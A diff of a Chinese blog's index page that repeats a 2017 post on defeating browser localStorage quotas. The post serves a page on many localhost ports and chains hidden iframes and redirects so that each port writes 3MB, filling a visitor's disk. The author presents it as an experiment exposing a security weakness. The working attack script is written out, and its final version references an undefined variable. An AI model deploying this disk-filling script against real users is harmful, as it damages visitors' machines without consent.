class="built_in">return</span>;</div><div class="line">      <span class="keyword">if</span>(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">        <span class="variable">$iframe</span>.src = url;</div><div class="line">        document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/07/17/h5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-h6" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/17/h6/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+    </h1>
+  
+
+        
+        <a href="/2017/07/17/h6/" class="archive-article-date">
+  	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：这样的限制足够保护用户硬盘了吗？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个域名+端口。<br>也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<a href="http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：" target="_blank" rel="external">http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">var fs = require(<span class="string">'fs'</span>);</div><div class="line">//100个端口</div><div class="line"><span class="keyword">for</span>(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(<span class="keyword">function</span> (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="keyword">function</span>(err, content)&#123;</div><div class="line">      <span class="keyword">if</span>(err) &#123;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        response.writeHead(200, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = <span class="string">""</span>;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line"><span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += <span class="string">"0"</span>;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</div></pre></td></tr></table></figure></p>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？</p>
+<p>iframe是个好的尝试。<br>只要一打开<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1000，页面的脚步就会创建一个iframe，去请求<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1001，一直循环下去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      //新添加iframe</div><div class="line">      var url = <span class="string">"http://127.0.0.1:"</span> + port;</div><div class="line">      var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">      <span class="variable">$iframe</span>.src = url;</div><div class="line">      document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：</p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      <span class="keyword">if</span>(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">        <span class="variable">$iframe</span>.src = url;</div><div class="line">        document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/07/17/h6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-h3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/17/h3/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+    </h1>
+  
+
+        
+        <a href="/2017/07/17/h3/" class="archive-article-date">
+  	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：这样的限制足够保护用户硬盘了吗？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个域名+端口。<br>也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<a href="http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：" target="_blank" rel="external">http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">var fs = require(<span class="string">'fs'</span>);</div><div class="line">//100个端口</div><div class="line"><span class="keyword">for</span>(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(<span class="keyword">function</span> (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="keyword">function</span>(err, content)&#123;</div><div class="line">      <span class="keyword">if</span>(err) &#123;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        response.writeHead(200, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = <span class="string">""</span>;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line"><span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += <span class="string">"0"</span>;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</div></pre></td></tr></table></figure></p>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？</p>
+<p>iframe是个好的尝试。<br>只要一打开<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1000，页面的脚步就会创建一个iframe，去请求<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1001，一直循环下去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      //新添加iframe</div><div class="line">      var url = <span class="string">"http://127.0.0.1:"</span> + port;</div><div class="line">      var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">      <span class="variable">$iframe</span>.src = url;</div><div class="line">      document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：</p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      <span class="keyword">if</span>(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">        <span class="variable">$iframe</span>.src = url;</div><div class="line">        document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/07/17/h3/">展开全文 >></a>
         </p>
       
 
@@ -414,7 +834,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">Hello World&lt;br&gt;&lt;br&gt;这是我的第一个技术博客&lt;br&gt;谢谢大家&lt;br&gt;&lt;br&gt;  ----  kookokukyo</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">&lt;br&gt;&lt;br&gt; &quot; Writing code is keep my heart beating &lt;br&gt; only resson &quot; &lt;br&gt;&lt;br&gt; ---- Kookokukyo said &lt;br&gt;&lt;br&gt;</div>
   	  	
     	</section>
     
